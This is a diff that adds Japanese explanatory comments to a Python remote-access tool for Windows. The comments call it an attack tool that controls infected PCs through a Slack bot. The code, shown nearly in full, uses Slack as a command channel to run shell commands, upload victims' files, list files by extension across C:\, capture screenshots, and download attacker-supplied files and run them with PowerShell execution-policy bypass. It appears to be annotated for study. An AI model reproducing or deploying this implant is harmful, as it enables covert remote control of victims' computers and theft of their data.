@@ -1,3 +1,9 @@
+#slackボットを通じた命令の送受信
+#遠隔操作ツールとなるslackボットの作成
+#slackボットのプログラムを観戦済みの攻撃対象に配信し、SlacktのWebsocketを開け、そこから介して指令やファイルを送信し、slackワークスペースに対して実行結果を出力する
+#攻撃者はslackのアプリにメッセージを送るだけ
+#OSコマンド, 指定されたファイルのアップロード, PC内にある指定された拡張子を持つファイルの列挙, スクリーンショットの取得, 攻撃者側からアップロードしたファイルをダウンロードし実行, ボットの終了
+
 # -*- config:utf-8 -*-
 __author__ = 'Hiroyuki Kakara'
 import ctypes
@@ -5,6 +11,8 @@ import locale
 import os
 import platform
 import requests
+
+#slack用のフレームワーク
 from slack_bolt import App
 from slack_bolt.adapter.socket_mode import SocketModeHandler
 import socket
@@ -14,20 +22,24 @@ import win32con
 import win32gui
 import win32ui
 
+#認証情報
 SLACK_URL = 'https://slack.com/api/'
 SLACK_APP_TOKEN = 'xapp-<your App-Level Access Token>'
 SLACK_BOT_TOKEN = 'xoxb-<your Bot User OAuth Access Token>'
 app = App(token=SLACK_BOT_TOKEN)
 mychannel = ''
      
+#感染PC固有のチャネルを作成
 def conversations_create(name):
     parameters = {'token': SLACK_BOT_TOKEN, 'name': name}
     res = requests.post(SLACK_URL + 'conversations.create', data=parameters)
 
+#作成されたチャネルIDの取得
 def conversations_setTopic(channel, topic):
     parameters = {'token': SLACK_BOT_TOKEN, 'channel': channel, 'topic':topic}
     res = requests.post(SLACK_URL + 'conversations.setTopic', data=parameters)
 
+#チャネルのトピック欄への感染PCについての情報の記載
 def convert_channelname_to_id(channel_name):
     parameters = {'token': SLACK_BOT_TOKEN}
     res = requests.post(SLACK_URL + 'conversations.list', data=parameters)
@@ -39,9 +51,13 @@ def convert_channelname_to_id(channel_name):
                 break
     return channel_id
 
+#コマンド処理を受け持つ
+#チャネルに登録されたファイルをダウンロードし、それぞれのファイル拡張子に応じた形で非同期で実行
 def file_dl_exec(url, filename):
+    #取得したトークンをヘッダーに追加
     headers = {'Authorization': "Bearer " + SLACK_BOT_TOKEN}
     res = requests.get(url, headers=headers)
+    #ファイルに保存
     with open(filename, 'wb') as dl_file:
         dl_file.write(res.content)
     command = ''
@@ -53,16 +69,21 @@ def file_dl_exec(url, filename):
         command = f'powershell -ExecutionPolicy Bypass -File {filename}'
     else:
         command = filename
+    #ダウンロードしたファイルの拡張子に応じて実行プログラムを選択し、非同期のサブプロセスとしてファイルを実行
     res = subprocess.Popen(command, stdout=subprocess.PIPE)
     return f'{filename} Started.'
 
+#OS標準コマンドを実行
 def exec_command(command):
+    #処理の結果を受け取絵うため、同期型にてサブプロセスを実行
     res = subprocess.run(command, stdout=subprocess.PIPE)
+    #日本語版Windows上で実行している場合のデコード
     if locale.getdefaultlocale() == ('ja_JP', 'cp932'):
         return res.stdout.decode('cp932')
     else:
         return res.stdout.decode()
 
+#引数で指定されたファイルパスが存在する場合、それをチャネルにアップロードする
 def file_up(filepath):
     if os.path.exists(filepath):
         files = {'file': open(filepath, 'rb')}
@@ -75,6 +96,7 @@ def file_up(filepath):
     else:
         return f'File not found - {filepath}.'
 
+#引数で与えられた拡張子のファイルを列挙し、改行区切りの文字列で返す
 def file_dir(extension):
     file_paths = list()
     for parent, _, filenames in os.walk('c:\\'):
@@ -84,6 +106,7 @@ def file_dir(extension):
                 file_paths.append(document_path)
     return '\r\n'.join(file_paths)
 
+#スクリーンショットの取得の上、チャネルにscreenshot.bmpをアップロードする関数
 def get_dimensions():
     PROCESS_PER_MONITOR_DPI_AWARE = 2
     ctypes.windll.shcore.SetProcessDpiAwareness(PROCESS_PER_MONITOR_DPI_AWARE)
@@ -131,13 +154,17 @@ def build_help():
            "help: Display this help.")
     return res
 
+#メッセージをパースする関数
 def parse_event(event):
     res = None
     try:
+        #自分で作ったチャネルにメッセージを投稿した場合にのみ反応する条件を絞る
         if event['channel'] == mychannel:
+            #messageにfileが含まれる場合、攻撃者側がチャネルにファイルを投稿したという事なので、ダウンロードして実行する為にfile_dl_execにファイルダウンロード用URLとファイル名を渡す
             if 'files' in event:
                 for file_ in event['files']:
                     res = file_dl_exec(file_['url_private_download'], file_['name'])
+            #その他の場合は、text部分の先頭の先頭文字をコマンドとして解釈し、それぞれに応じた関数を呼ぶ
             else:
                 command = event['text']
                 if command == 'exit':
@@ -157,6 +184,7 @@ def parse_event(event):
         pass
     return res
 
+#メッセージを受けとった際のイベント
 @app.event("message")
 def event(event, say):
     res = parse_event(event)
@@ -191,6 +219,7 @@ def main():
     mychannel = convert_channelname_to_id(mychannel_name)
     conversations_setTopic(mychannel, build_topic())
 
+    #slackサーバーとのwebsocketを開く
     SocketModeHandler(app, SLACK_APP_TOKEN).start()
 
 if __name__ == '__main__':
